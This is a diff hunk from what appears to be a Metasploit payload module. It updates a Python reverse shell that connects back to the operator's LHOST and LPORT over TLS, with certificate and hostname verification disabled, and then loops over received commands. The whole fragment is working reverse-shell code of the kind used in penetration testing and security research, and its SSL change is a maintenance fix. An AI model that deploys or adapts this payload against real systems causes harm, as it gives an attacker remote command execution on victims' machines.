@@ -48,7 +48,13 @@ module MetasploitModule
       import ssl
       so=s.socket(s.AF_INET,s.SOCK_STREAM)
       so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
-      so=ssl.wrap_socket(so)
+      if hasattr(ssl,'SSLContext'):
+        ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname=False
+        ctx.verify_mode=ssl.CERT_NONE
+        so=ctx.wrap_socket(so)
+      else:
+        so=ssl.wrap_socket(so)
       while True:
       	d=so.recv(1024)
       	if len(d)==0:
